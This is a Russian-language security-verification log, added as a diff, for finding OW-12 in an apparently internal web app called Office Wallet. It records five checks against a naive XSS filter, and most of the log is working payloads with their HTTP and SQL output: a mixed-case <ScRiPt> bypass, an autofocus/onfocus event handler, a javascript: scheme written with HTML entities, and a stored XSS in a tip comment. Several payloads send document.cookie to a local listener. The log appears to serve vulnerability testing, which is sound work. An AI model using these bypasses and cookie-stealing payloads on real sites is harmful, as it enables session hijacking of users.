@@ -1,0 +1,75 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-12
+################################################################################################
+--- проверка 1/5 ---
+== 2. OW-12: что фильтр реально делает: строчный <script> вырезается ==
+    · sanitizeSearchDisplay ищет 'script' через strings.Index — с регистром.
+    · Обычный <script> в ответе превращается в <>, содержимое остаётся мусором:
+    → GET /history?q=<script>alert(1)</script>  (эталон: должно быть вырезано)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    ┌─ АРТЕФАКТ · OW-12 · контроль фильтра пропускает небезопасный вывод
+    │ GET /history?q=<script>… → HTTP 200
+    │ в сохранённом фрагменте <script> удалён наивной фильтрацией; сырая строка выводится через QRaw
+    └─
+[+] строчный script вырезан, в строке осталось: alert(1)
+
+--- проверка 2/5 ---
+== 3. OW-12: обход регистром: <ScRiPt> доходит до жертвы как есть ==
+    · strings.Index чувствителен к регистру, а теги в HTML — нет. Смешанный
+    · регистр не встречается со списком ни в одном месте, фильтр не трогает
+    · строку, и браузер жертвы такой тег исполняет:
+    → GET /history?q=<ScRiPt>... (обход по регистру)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    ┌─ АРТЕФАКТ · OW-12 · XSS через mixed-case tag отражён без экранирования
+    │ GET /history?q=<ScRiPt>… → HTTP 200
+    │ HTML payload в ответе: <ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
+    └─
+[+] payload в ответе байт в байт, экранирования нет: <ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
+
+--- проверка 3/5 ---
+== 4. OW-12: обход событием, которого нет в списке ==
+    · В списке onerror, onload, onmouseover. Событие onfocus оттуда отсутствует
+    · и не вырезается вообще — плюс autofocus запускает его без действий жертвы:
+    → GET /history?q=<input autofocus onfocus=...>  (onfocus не в чёрном списке)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    ┌─ АРТЕФАКТ · OW-12 · событие вне denylist отражено без экранирования
+    │ GET /history?q=<input autofocus onfocus=…> → HTTP 200
+    │ ответ содержит: <input autofocus onfocus=new Image().src="http://127.0.0.1:9999/?"+document.cookie>
+    └─
+[+] событие вне списка прошло целиком
+
+--- проверка 4/5 ---
+== 5. OW-12: обход HTML-сущностью: javascript: пишем через сущности ==
+    · Фильтр ищет буквальную строку 'javascript:', и заодно в ней есть подстрока
+    · 'script' — то есть вырезается она целиком, даже если заменить буквы на
+    · сущности, надо ломать и 'script'. В атрибутах браузер декодирует сущности
+    · уже после фильтра, поэтому в исходнике нет ни одной запрещённой строки, а
+    · схема в браузере собирается заново:
+    → GET /history?q=<iframe src=&#106;ava&#115;cript:...>  (сущности вместо j и s)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    ┌─ АРТЕФАКТ · OW-12 · HTML entities проходят фильтр и остаются в ответе
+    │ GET /history?q=<iframe src=entities> → HTTP 200
+    │ HTML payload в ответе: <iframe src="&#106;ava&#115;cript:alert(document.cookie)"></iframe>
+    └─
+[+] javascript: через сущности прошёл фильтр
+
+--- проверка 5/5 ---
+== 6. OW-12: сохранённый XSS в чаевых: живёт в базе и открывается потом ==
+    · Тот же фильтр стоит на комментарии чаевых (handlers_money.go:292), поэтому
+    · обход тот же. Чаевые отправляем себе — проверки на себя нет, деньги в итоге
+    · возвращаются на тот же счёт. Сохранённый payload открывается жертвой позже,
+    · по ссылке /tips/received?id=N, и там он выводится как template.HTML (строка 344):
+    → POST /tips/new  recipient=ivanov amount_rub=10 comment=<ScRiPt>...
+    ← HTTP 302 redirect=http://localhost:18081/history  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → GET /tips/received  (ищем id своего чаевого)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Входящие чаевые · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapi...
+    → GET /tips/received?id=591  (карточка, Template.HTML без экранирования)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Чаевые #591 · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    → SQL SELECT memo FROM operations WHERE id=591
+    ← psql <ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
+    ┌─ АРТЕФАКТ · OW-12 · сохранённый XSS лежит в БД и возвращается карточкой
+    │ operations.id=591 memo=<ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
+    │ GET /tips/received?id=591 → HTTP 200; payload не экранирован
+    └─
+[+] сохранённый payload лежит в карточке без экранирования: /tips/received?id=591
